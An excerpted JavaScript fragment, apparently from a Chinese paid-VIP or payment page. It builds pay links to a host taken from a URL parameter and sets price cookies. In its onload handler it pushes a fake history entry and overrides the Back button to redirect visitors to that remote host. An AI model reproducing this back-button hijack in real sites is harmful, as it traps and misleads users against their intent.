...
if (/check/i.test(location.pathname)) {
  ...
  rhost  = getParam('rhost') ? getParam('rhost'): defaultRhost;
    var money = 48;
    var money2 = $("input[name='vipType']:checked").val();
    if(money2 != undefined && money2 != '' && money2 != null && parseInt(money2)>48) money = money2;
  var apiurl = "http://"+ rhost + apiurl;
  var baseQs = genBaseQuerystring();
  var paylink=apiurl+"?"+baseQs
    + "&money="+money+"&ruel=" + location.href + "&money="+money+'&'+baseQs ;
  if(uhost){
  ...
  $(".ui-btn-weixin").on("click",
    function() {
      ...
      var paytype =$(this).attr('id').split('-').pop();
        ...
        var money2 = $("input[name='vipType']:checked").val();
        if(money2 != undefined && money2 != '' && money2 != null && parseInt(money2)>48) money = money2;
      paylink += '&paytype='+paytype+'&money='+money;
        //console.log(paylink);return false;
      window.location.href = paylink;
      return;
      if ("" !== paylink){
...
window.onload = function(){
   window.setTimeout(function(){history.pushState(null, null, "#tuit");window.onpopstate = function(){window.location.href = "http://" + rhost + "/?d=" + window.btoa(refid) + "&do=daog.html"; return false;};},1000);
 	//第2层
...
if(!stime){
 ...
 //     setTimeout(function(){
 //       var img =new Image();  
 //       img.src = "http://mp.weixin.qq.com/";  
 //     },2000);
 // }
 //
$('.checkviptype').click(function(){
    $("input[name='vipType']").removeAttr("checked");
    $(this).find('.grayRadio').attr('checked','true');
    var money = $(this).find('.grayRadio').attr('value');
    delCookie('money');
    setCookie('money',money,'d9');
});
delCookie('money');